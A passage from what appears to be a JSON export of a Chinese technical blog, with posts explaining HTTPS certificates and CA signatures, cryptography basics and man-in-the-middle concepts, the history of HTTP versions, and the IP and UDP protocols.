Authority，CA）公钥被掉包，是因为Client无法分辨，传回的公钥是中间人，还是服务器生成的，这也是密码学中的身份验证问题。 我们知道，现实中有公证处，它提供的公证材料大家都信任，那在网络世界也可以建立一个这样的具备公信力的认证中心， 这个中心给大家颁发一个证书， 用于证明服务商的身份。 这个证书里除了包含这个服务商的基本信息之外，还有包括最关键的一环：服务商对应Server生成的公钥。 在网络世界中，这个权威且具备公信力的认证中心就叫Certificate Authority（CA）。而CA颁布的公证材料就是数字证书（Digital Certificate）。 在介绍数字证书（Digital Certificate）之前，我们需要先知道什么是消息摘要（message digest）和数字签名（Digital Signature）。 消息摘要（message digest）服务商将自己的基本信息和对应Server的公钥，用一个Hash算法生成一个消息摘要（message digest）。 ![HTTPS-Message Digest](assets/HTTPS-Message Digest.png) 这个Hash算法有个非常重要的特性，只要输入数据有一点点变化，那生成的消息摘要就会有巨变，这样就可以防止别人修改原始内容。 但是，只依赖消息摘要（message digest），我们仍然无法防止中间人攻击（或者说Client无法判断公钥来自中间人，还是真正的Server）。 因为，Server将服务商的基本信息、服务商对应Server的公钥和对应的消息摘要（message digest）一起发给Client时，中间人仍然可以对这些数据进行拦截，并且将”服务商对应Server的公钥”替换为自己生成的公钥，再基于自己生成的公钥和服务商的基本信息重新生成一个新的消息摘要（message digest）。 数字签名（Digital Signature）在消息摘要（message digest）的基础之上，Certificate Authority（CA）用它的私钥对消息摘要加密，形成数字签名（Digital Signature）。 ![HTTPS-Digital Signature](assets/HTTPS-Digital Signature.png) 数字证书（Digital Certificate）最终，把原始信息（包括服务商自己的基本信息和对应Server的公钥）和数字签名合并， 形成一个全新的东西，叫做数字证书（Digital Certificate）。 这样，当Client要向Server请求数据时，Server先把它的证书发给Client， Client用同样的Hash 算法，将原始信息（包括服务商自己的基本信息和对应Server的公钥） 生成消息摘要，然后用CA提供的公钥对数字签名解密或者原始消息摘要。通过比较这两个消息摘要，就知道Server公钥有没有被篡改了。 ![HTTPS- Match](assets/HTTPS- Match.png) 数字证书的中间人攻击你可能会想，即使我们引入了Certificate Authority，而且还使用Certificate Authority的私钥对消息摘要进行加密，以生成数字签名，会不会还会遭受中间人攻击。答案是不会。 因为，在攻击者不知道CA私钥的前提下，如果攻击者直接修改数字签名的值，当Client浏览器在执行数字证书校验时，用CA提供的公钥直接对修改后的数字签名进行解密，将会得到一个未知值。而这个未知值一定不会和 将服务商基本信息和对应Server的公钥进行Hash算法后得到的消息摘要相等。 因此，在上图中两消息摘要相同，则一定能保证Client拿到的公钥一定是由Server对应的服务商提供的。 总结安全传输保障前提基于数字证书+非对称加密的HTTP安全传输机制依赖于以下前提： CA私钥的保密性； Client浏览器在执行数字证书校验的过程中，没有漏洞； Client浏览器的根证书验证机制没有漏洞（即，对数字签名进行解密时，使用的公钥如CA所期望，而未被攻击者在Client操作系统层面进行替换）。 数字证书的内容X.509 应该是比较流行的 SSL 数字证书标准，包含（但不限于）以下的字段： 字段 值说明 对象名称（Subject Name） 用于识别该数字证书的信息 共有名称（Common Name） 对于客户证书，通常是相应的域名 证书颁发者（Issuer Name） 发布并签署该证书的实体的信息 签名算法（Signature Algorithm） 签名所使用的算法 序列号（Serial Number） 数字证书机构（Certificate Authority， CA）给证书的唯一整数，一个数字证书一个序列号 生效期（Not Valid Before） 失效期（Not Valid After） 公钥（Public Key） 可公开的密钥 签名（Signature） 通过签名算法计算证书内容后得到的数据，用于验证证书是否被篡改 除了上述所列的字段，还有很多拓展字段，在此不一一详述。 数字证书实例我们来看看Google的证书： Reference 《HTTPS权威指南》 https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E6%80%A7%E5%8D%94%E5%AE%9A 看图学HTTPS - https://segmentfault.com/a/1190000014954687 一个故事讲完https - https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA TLS 1.3科普——新特性与协议实现 - https://zhuanlan.zhihu.com/p/28850798 HTTP和HTTPS详解 - https://juejin.im/post/5af557a3f265da0b9265a498 一个故事讲完https - https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA iOS 中对 HTTPS 证书链的验证 - https://www.cnblogs.com/oc-bowen/p/5896041.html","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【Security】密码学基础","date":"2019-05-13T02:31:38.000Z","path":"2019/05/13/【Security】密码学基础/","text":"背景 Alice和Bob是谁？ 讨论密码学时，我们为了方便起见，通常会使用Alice和Bob这两个名字。他们可以使枯燥的密码学命题变得更加有趣一些。大家公认，Ron Rivest在1977年介绍RSA密码系统的论文中，首次使用了这两个名字。 此后，又有其他一些名字进入了密码学文化。比如，一名具备窃听能力的攻击者叫Eve，一位能妨碍网络流量的主动攻击者叫 Mallory。 对称加密（symmetric encryption）/私钥加密（private-key cryptography）对称加密（symmetric encryption）又称私钥加密（private-key cryptography），是一种混淆算法，能够让数据在非安全信道上进行安全通信。 为了保证通信安全，Alice和Bob首先得到双方都认可的加密算法和密钥。当Alice需要向Bob发送数据时，她使用这个密钥加密数据。Bob使用相同的密钥解密。 Eve能够访问信道，所以可以看到加密数据；但因为没有密钥，所以看不到原始数据。Alice和Bob只要能保证密钥安全，就能一直安全地通信，如下图所示。 注意讨论加密时通常会使用到三个术语：明文（plaintext，即原始数据）、密钥（cipher， 用于加密）和密文（ciphertext，即加密后的数据）。 对称加密可以追溯到上千年以前。比如，加密时将字母表中的每个字母替换成其他字母，解 密时反向操作，这就是代替密码加密。在这个例子中，不存在密钥；安全性取决于保守加密方法 的秘密。那就是最早的算法的例子。随着时间的流逝，我们采用了另一种方法。它是依照19世纪 的一位密码破解专家Auguste Kerckhoffs的观察结果发展而来的 。 即使攻击者知晓了整个密码系统除密钥以外的所有情报，系统仍然应当能保证安全。 Kerckhoffs的原则初看起来有些奇怪，但如果继续深刻思考，就会觉得有道理，原因如下。 如果一种加密算法要得到广泛使用，就必须让其他人知道。当越来越多的人接触到这个算法，那么敌人得到这个算法的可能性也会增加。 没有密钥的简单算法非常不便于在大群体中使用；每个人都可以解密所有人的通信。 设计出优秀的加密算法非常困难。一种算法想要更安全，就得经过更多的曝光和审视。 当需要采用一种新算法时，密码学家推荐使用保守的方法来确定算法是否安全，那就是算法需要经过许多年的破解尝试。 优秀的加密算法需要产出表面上看来随机的密文，这样攻击者就无法分析得出任何关于明文的信息。比如，替换密码就不是一种好算法，因为攻击者可以确定密文中各个字母的使用频率， 并将其与英语中的字母使用频率进行对比。因为某些字母比其他字母使用得更频繁，攻击者可以 利用这个结果恢复明文。如果加密算法优秀，攻击者只有一种方法，那就是尝试所有可能的解码密钥，俗称穷举密钥搜索（exhaustive key search）。 基于这一点，我们可以说密文的安全性完全取决于密钥。如果密钥是从某个非常大的密钥空 间中选取出来的，那么破解也需要遍历所有这些可能的密钥，其数量极大，几乎不可能。我们可 以说这种算法在计算上是安全性的。 非对称加密（Asymmetric Encryption）/ 公钥加密（Public key Cryptography）背景对称加密在高速处理大量数据方面做得非常好，然而随着使用它的团体增加，产生了更多的 需求，使得对称加密无法满足。 相同团体的成员必须共享相同的密钥。越多人加入，团体密钥出现问题的次数就越多。 为了更好的安全性，你可以在每两个人之间使用不同的密钥，但是这个方法不可扩展。虽然3个人只需要3个密钥， 但10个人就需要45（9+8+…+1）个密钥，而1000个人需要 499 500个密钥！ 对称加密不能用于访问安全数据的无人系统。因为使用相同的密钥可以反转整个过程， 这样的系统出现任何问题都会影响到存储在系统中的所有数据。 非对称加密（asymmetric encryption）又称为公钥加密（public key cryptography），它是另一 种方法，使用两个密钥，而不是一个；其中一个密钥是私密的，另一个是公开的。顾名思义，一 个密钥用于私人，另一个密钥将会被所有人共享。这两个密钥之间存在一些特殊的数学关系，使 得密钥具备一些有用的特性。如果你利用某人的公钥加密数据，那么只有他们对应的私钥能够解 密，如下图所示。 从另一个方面讲，如果某人用私钥加密数据，任何人都可以利用对应的公钥 解开消息。后面这种操作不提供机密性，但可以用作数字签名。 非对称加密使得大规模团体的安全通信大幅简化。假设你可以广泛并且安全地分享你的公钥，那么任何人都可以向你发送消息，只有你可以阅读。如果他们使用各自的私钥签名，你还可以精确地知道消息出自何人之手。 虽然公钥密码的属性非常有趣，但它却非常缓慢，不适用于数据量大的场景。因此，它往往 被部署于进行身份验证和共享秘密的协商，这些秘密后续将用于快速的对称加密。 数字签名（Digital Signature）数字签名（digital signature）是一个密码学方案。它使得验证一条电子消息或者一篇电子文档的真实性成为可能。 借助公钥密码，数字签名可以与现实生活中的手写签名类似。我们可以利用公钥密码的非对称性设计出一种算法，使用私钥对消息进行签名，并使用对应的公钥验证它。 实际的方式依照选择的公钥密码体系而有所不同。下面以RSA为例。RSA可以用于加密，也可以用于解密。如果使用RSA私钥加密，那么仅能通过对应的公钥解密。我们可以利用这个性质， 并且结合散列函数，实现数字签名。 计算希望签名的文档的散列。不论输入文档的长度如何，输出长度总是固定的。比如， 使用SHA256就是256位。 对结果散列和一些额外的元数据进行编码。比如，接收方需要知道你使用的散列算法， 否则不能处理签名。 使用私钥加密编码过的数据，其结果就是签名，可以追加到文档中作为身份验证的依据。 为了验证签名，接收方接收文档并使用相同的散列算法独立计算文档散列。接着，她使用公钥对消息进行解密，将散列解码出来，再确认使用的散列算法是否正确，解密出的散列是否与本地计算的相同。这个方案的强度取决于加密、散列以及编码组件各自的强度。 中间人（man-in-the-middle，MITM）攻击 取得访问权 在很多案例中，攻击者需要接近受害人或服务器，或者取得通信设施的访问权。无论是谁， 只要能进入线路和中间通信节点（比如路由器），就能够看到线路上通行的数据帧，并且能够对它们进行干预。可以通过割开电缆 、与运营商共谋或者直接侵入设备来获取访问权。 理论上，执行MITM攻击的最简单方法是加入网络，然后将受害者的通信重新路由到恶意节 点。现在很多人都在使用的无线网络并没有身份验证机制，任何人都可以加入，所以尤其容易受 到这种攻击。 其他攻击方式包括妨碍域名解析、IP地址路由等的路由基础设施。 ARP欺骗地址解析协议（address resolution protocol，ARP）用于在局域网中将MAC地址 ④ 与IP地址进 行关联。进入网络的攻击者可以声明任何IP地址，并对网络流量进行有效的重路由。 WPAD劫持浏览器使用Web代理自动发现协议（web proxy auto-discovery protocol，WPAD）自动获取HTTP 代理的配置。WPAD使用了好几种方法，包括DHCP和DNS。为了攻击WPAD，攻击者在局域网 中启动一台服务器并将其通知到那些寻找服务的本地客户端。 DNS劫持只要攻击者能通过注册或者改变DNS配置来劫持某个域名，就可以劫持访问这个域名的所有 流量。 DNS缓存中毒DNS缓存中毒（DNS cache poisoning）是一种攻击者利用DNS缓存服务器的缺陷在缓存中注 入非法域名信息的攻击方式。成功完成这种攻击以后，受影响的DNS服务器的所有用户都将收到 攻击者构造的非法信息。 BGP路由劫持边界网关协议（border gateway protocol，BGP）是一种互联网骨干网络用于发现如何精确定 位IP地址段的路由协议。如果某个非法路由信息被一个或更多路由器所接受，所有通往某个特定 IP地址段的流量都将被重定向到另一处，即攻击者那里。 Reference 《HTTPS权威指南》","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【Network】HTTP协议的演变","date":"2019-05-08T14:11:47.000Z","path":"2019/05/08/【HTTP】HTTP协议的演变/","text":"HTTP/0.9最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令GET： 1GET /index.html 上面命令表示，TCP 连接（connection）建立后，客户端向服务器请求（request）网页index.html。 协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式： 123&lt;html&gt; &lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt; 服务器发送完毕，就关闭TCP连接。 HTTP/1.0简介1996年5月，HTTP/1.0 版本发布，内容大大增加（详见 RFC1945）。 首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。 其次，除了GET命令，还引入了POST命令和HEAD命令，丰富了浏览器与服务器的互动手段。 再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。 其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等。 请求格式下面是一个1.0版的HTTP请求的例子： 123GET / HTTP/1.0User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)Accept: / 可以看到，这个格式与0.9版有很大变化。 第一行是请求命令，必须在尾部添加协议版本（HTTP/1.0）。后面就是多行头信息，描述客户端的情况。 响应格式（Response）服务器的回应如下： 12345678910HTTP/1.0 200 OK Content-Type: text/plainContent-Length: 137582Expires: Thu, 05 Dec 1997 16:00:00 GMTLast-Modified: Wed, 5 August 1996 15:55:28 GMTServer: Apache 0.84&lt;html&gt; &lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt; 回应的格式是”头信息 + 一个空行（\\r\\n） + 数据”。其中，第一行是”协议版本 + 状态码（status code） + 状态描述”。 Content-Type 字段关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。 下面是一些常见的Content-Type字段的值： 123456789101112text/plaintext/htmltext/cssimage/jpegimage/pngimage/svg+xmlaudio/mp4video/mp4application/javascriptapplication/pdfapplication/zipapplication/atom+xml 这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。 缺点HTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。 TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（slow start）。所以，HTTP 1.0版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。 为了解决这个问题，有些浏览器在请求时，用了一个非标准的Connection字段： 1Connection: keep-alive 这个字段要求服务器不要关闭TCP连接，以便其他请求复用。 服务器同样回应这个字段： 1Connection: keep-alive 一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。 但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。 HTTP/1.11997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。 HTTP/1.1进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。 持久连接1.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。 客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。 不过，规范的做法是，客户端在最后一个请求时，发送Connection: close，明确要求服务器关闭TCP连接： 1Connection: close 目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。 管道机制1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。 举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。 Content-Length 字段一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。 这就是Content-length字段的作用，声明本次回应的数据长度： 1Content-Length: 3495 上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。 在1.0版中，Content-Length字段不是必需的，因为浏览器发现服务器关闭了TCP连接，就表明收到的数据包已经全了。 分块传输编码使用Content-Length字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。 对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送一块，采用”流模式”（stream）取代”缓存模式”（buffer）。 其他功能1.1版还新增了许多动词方法：PUT、PATCH、HEAD、 OPTIONS、DELETE。 另外，客户端请求的头信息新增了Host字段，用来指定服务器的域名： Host: example.com 有了Host字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。 缺点虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。 服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为”队头堵塞”（Head-of-line blocking）。 为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。 SPDY 协议2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。 这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。 HTTP/2二进制协议HTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。 二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。 多工HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。 举例来说，在一个TCP连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。 这样双向的、实时的通信，就叫做多工（Multiplexing）。 数据流因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。 HTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。 数据流发送到一半的时候，客户端和服务器都可以发送信号（RST_STREAM帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/2 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。 客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。 头信息压缩HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如Cookie和User Agent，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。 HTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用gzip或compress压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。 服务器推送HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。 常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。 HTTP1.1和HTTP2区别HTTP2与HTTP1.1最重要的区别就是解决了线头阻塞的问题！其中最重要的改动是：多路复用 (Multiplexing) 多路复用意味着线头阻塞将不在是一个问题，允许同时通过单一的 HTTP/2 连接发起 多重的请求-响应消息 ，合并多个请求为一个的优化将不再适用。 (我们知道：HTTP1.1中的Pipelining是没有付诸于实际的)，之前为了减少HTTP请求，有很多操作将多个请求合并，比如：Spriting(多个图片合成一个图片)，内联Inlining(将图片的原始数据嵌入在CSS文件里面的URL里），拼接Concatenation(一个请求就将其下载完多个JS文件)，分片Sharding(将请求分配到各个主机上)…… 使用了HTTP2可能是这样子的： HTTP2所有性能增强的核心在于新的二进制分帧层(不再以文本格式来传输了)，它定义了如何封装http消息并在客户端与服务器之间传输。 看上去协议的格式和HTTP1.x完全不同了，实际上HTTP2并没有改变HTTP1.x的语义，只是把原来HTTP1.x的header和body部分用frame重新封装了一层而已： Reference 从HTTP/0.9到HTTP/2：一文读懂HTTP协议的历史演变和设计思路 - http://www.52im.net/thread-1709-1-1.html HTTP2和HTTPS来不来了解一下？ - https://juejin.im/post/5b5ef5a25188251af86bfebf","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"},{"name":"HTTP","slug":"Network/HTTP","permalink":"http://swsmile.info/categories/Network/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"},{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】IP 协议（网际协议）","date":"2019-05-08T08:16:49.000Z","path":"2019/05/08/【Network】IP-IP协议/","text":"IP 协议（网际协议）IP协议是TCP/IP协议的核心，所有的TCP，UDP，IMCP，IGCP的数据都以IP数据格式传输。 要注意的是，IP不是可靠的协议，这是说，IP协议没有提供一种数据未传达以后的处理机制－－这被认为是上层协议（TCP或UDP）来负责的事情。所以这也就出现了TCP是一个可靠的协议，而UDP就没有那么可靠的区别。 IP Datagram FormatIPv4IPv4 Datagram分为首部（Header）和数据两部分。IPv4 Header由固定部分（Basic）和选项部分（Options）组成，其中固定部分的大小为20 bytes。IPv4 Header最大为60 bytes。 IP版本：现在的IP版本号是4，所以也称作IPv4。现在还有IPv6，而且运用也越来越广泛了。 TTL（Time-to-Live）：这个字段规定该数据包在穿过多少个路由之后会被抛弃。 这里就体现出来IP协议包的不可靠性，它不保证数据被送达。某个IP数据包每穿过一个路由器，该数据包的TTL数值就会减少1，当该数据包的TTL成为零，它就会被自动抛弃。这个字段的最大值也就是255，也就是说一个协议包也穿行过路由器255次后就会被抛弃了，根据系统的不同，这个数字也不一样，一般是32或者是64，Tracerouter这个工具就是用这个原理工作的，tranceroute的-m选项要求最大值是255，也就是因为这个TTL在IP协议里面只有8bit。 ToS(Type of Service)：DS Field(Differentiated Services Field) + ECN(Explicit Congestion Notification, 显式拥塞通知) IPv6与IPv4 Header不同，IPv6 Header具有固定的大小（40 bytes），并且没有选项部分。但是IPv6 Header可以有扩展首部（extension headers），其作用与Options类似。Next Header字段用于指示extension headers。 IP路由选择当一个IP数据包准备好了的时候，IP数据包（或者说是路由器）是如何将数据包送到目的地的呢？它是怎么选择一个合适的路径来”送货”的呢？ 最特殊的情况是目的主机和主机直连，那么主机根本不用寻找路由，直接把数据传递过去就可以了。至于是怎么直接传递的，这就要靠ARP协议了。 稍微一般一点的情况是，主机通过若干个路由器（router）和目的主机连接。那么路由器就要通过IP包的信息来为IP包寻找到一个合适的目标来进行传递，比如合适的主机，或者合适的路由。路由器或者主机将会用如下的方式来处理某一个IP数据包： 如果IP数据包的TTL（生命周期）已到，则该IP数据包就被抛弃。 搜索路由表，优先搜索匹配主机，如果能找到和IP地址完全一致的目标主机，则将该包发向目标主机 搜索路由表，如果匹配主机失败，则匹配同子网的路由器，这需要“子网掩码(1.3.)”的协助。如果找到路由器，则将该包发向路由器。 搜索路由表，如果匹配同子网路由器失败，则匹配同网号路由器，如果找到路由器，则将该包发向路由器。 搜索路由表，如果以上都失败了，就搜索默认路由，如果默认路由存在，则发包 如果都失败了，就丢掉这个包 这再一次证明了，IP包是不可靠的。因为它不保证送达。 IP分片物理网络层一般要限制每次发送数据帧的最大长度。任何时候IP层接收到一份要发送的IP数据报时，它要判断向本地哪个接口发送数据（选路），并查询该接口获得其MTU。IP把MTU与数据报长度进行比较，如果需要则进行分片。分片可以发生在原始发送端主机上，也可以发生在中间路由器上。 把一份IP数据报分片以后，只有到达目的地才进行重新组装（这里的重新组装与其他网络协议不同，它们要求在下一站就进行进行重新组装，而不是在最终的目的地）。重新组装由目的端的IP层来完成，其目的是使分片和重新组装过程对运输层（TCP和UDP）是透明的，除了某些可能的越级操作外。已经分片过的数据报有可能会再次进行分片（可能不止一次）。IP首部中包含的数据为分片和重新组装提供了足够的信息。 回忆IP首部，下面这些字段用于分片过程。对于发送端发送的每份IP数据报来说，其标识字段都包含一个唯一值。该值在数据报分片时被复制到每个片中（我们现在已经看到这个字段的用途）。标志字段用其中一个比特来表示“更多的片”。除了最后一片外，其他每个组成数据报的片都要把该比特置1。片偏移字段指的是该片偏移原始数据报开始处的位置。另外，当数据报被分片后，每个片的总长度值要改为该片的长度值。 当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部，并在选择路由时与其他分组独立。这样，当数据报的这些片到达目的端时有可能会失序，但是在IP首部中有足够的信息让接收端能正确组装这些数据报片。 尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报。为什么会发生这种情况呢？因为IP层本身没有超时重传的机制——由更高层来负责超时和重传（TCP有超时和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自TCP报文段的某一片丢失后，TCP在超时后会重发整个TCP报文段，该报文段对应于一份IP数据报。没有办法只重传数据报中的一个数据报片。事实上，如果对数据报分片的是中间路由器，而不是起始端系统，那么起始端系统就无法知道数据报是如何被分片的。就这个原因，经常要避免分片。 使用UDP很容易导致IP分片（在后面我们将看到，TCP试图避免分片，但对于应用程序来说几乎不可能强迫TCP发送一个需要进行分片的长报文段）。我们可以用sock程序来增加数据报的长度，直到分片发生。在一个以太网上，数据帧的最大长度是1500字节，其中1472字节留给数据，假定IP首部为20字节，UDP首部为8字节。我们分别以数据长度为1471,1472,1473和1474字节运行sock程序。最后两次应该发生分片： Reference Oracle System Administration Guide: IP Services - https://docs.oracle.com/cd/E19683-01/806-4075/ipov-10/index.html Comer, D.E., 1995. Internetworking with TCP/IP, Vol. I: Principles, Protocols, and Architecture, 3/e. TCP/IP 协议 - https://juejin.im/entry/57a2b0742e958a006679dae0 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab 网络编程懒人入门(九)：通俗讲解，有了IP地址，为何还要用MAC地址？ - http://www.52im.net/thread-2067-1-1.html 面试时，你被问到过 TCP/IP 协议吗? - https://juejin.im/post/58e36d35b123db15eb748856","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】UDP","date":"2019-05-08T08:11:57.000Z","path":"2019/05/08/【Network】UDP/","text":"UDP是什么UDP是传输层协议，和TCP协议处于一个分层中，但是与TCP协议不同，UDP协议并不提供超时重传，出错重传等功能，也就是说UDP是不可靠的协议。 具体来说，它把应用程序传给IP层的数据发送出去，但是并不保证它们能到达目的地。由于缺乏可靠性，我们似乎觉得要避免使用UDP而使用一种可靠协议如TCP。 应用程序必须关心IP数据报的长度。如果它超过网络的MTU，那么就要对IP数据报进行分片。如果需要，源端到目的端之间的每个网络都要进行分片，并不只是发送端主机连接第一个网络才这样做。 UDP Datagram Format UDP 的检验和UDP检验和覆盖UDP首部和UDP数据。回想IP首部的检验和，它只覆盖IP的首部—并不覆盖IP数据报中的任何数据。 UDP和TCP在首部中都有覆盖它们首部和数据的检验和。UDP的检验和是可选的，而TCP的检验和是必需的。 UDP检验和覆盖UDP协议头和数据，这和IP的检验和是不同的，IP协议的检验和只是覆盖IP数据头，并不覆盖所有的数据。 UDP的伪首部尽管UDP检验和的基本计算方法与IP首部检验和计算方法相类似（16 bit字的二进制反码和），但是它们之间存在不同的地方。首先，UDP数据报的长度可以为奇数字节，但是检验和算法是把若干个16 bit字相加。解决方法是必要时在最后增加填充字节0，这只是为了检验和的计算（也就是说，可能增加的填充字节不被传送）。 其次，UDP数据报和TCP段都包含一个12字节长的伪首部，它是为了计算检验和而设置的。伪首部包含IP首部一些字段。其目的是让UDP两次检查数据是否已经正确到达目的地（例如，IP没有接受地址不是本主机的数据报，以及IP没有把应传给另一高层的数据报传给UDP）。 UDP数据报中的伪首部格式如下图所示： 在该图中，我们特地举了一个奇数长度的数据报例子，因而在计算检验和时需要加上填充字节。注意，UDP数据报的长度在检验和计算过程中出现两次。 如果检验和的计算结果为0，则存入的值为全1（65535），这在二进制反码计算中是等效的。如果传送的检验和为0，说明发送端没有计算检验和。 如果发送端没有计算检验和而接收端检测到检验和有差错，那么UDP数据报就要被悄悄地丢弃。不产生任何差错报文（当IP层检测到IP首部检验和有差错时也这样做）。 UDP检验和是一个端到端的检验和。它由发送端计算，然后由接收端验证。其目的是为了发现UDP首部和数据在发送端到接收端之间发生的任何改动。 UDP数据报长度问题理论上，IP数据报的最大长度是65535字节，这是由IP首部 16比特总长度字段所限制的。去除20字节的IP首部和8个字节的UDP首部，UDP数据报中用户数据的最长长度为65507字节。但是，大多数实现所提供的长度比这个最大值小。 我们将遇到两个限制因素。第一，应用程序可能会受到其程序接口的限制。socket API提供了一个可供应用程序调用的函数，以设置接收和发送缓存的长度。对于UDP socket，这个长度与应用程序可以读写的最大UDP数据报的长度直接相关。现在的大部分系统都默认提供了可读写大于8192字节的UDP数据报（使用这个默认值是因为8192是NFS读写用户数据数的默认值）。 UDP数据包最大长度根据 UDP 协议，从 UDP 数据包的包头可以看出，UDP 的最大包长度是 $2^{16}-1$ 的个字节。由于UDP包头占8个字节，而在IP层进行封装后的IP包头占去20字节，所以这个是UDP数据包的最大理论长度是 $2^{16} - 1 - 8 - 20 = 65507$ 字节。如果发送的数据包超过65507字节，send或sendto函数会错误码1(Operation not permitted， Message too long)，当然啦，一个数据包能否发送65507字节，还和UDP发送缓冲区大小（linux下UDP发送缓冲区大小为：cat /proc/sys/net/core/wmem_default）相关，如果发送缓冲区小于65507字节，在发送一个数据包为65507字节的时候，send或sendto函数会错误码1(Operation not permitted， No buffer space available)。 UDP数据包理想长度理论上 UDP 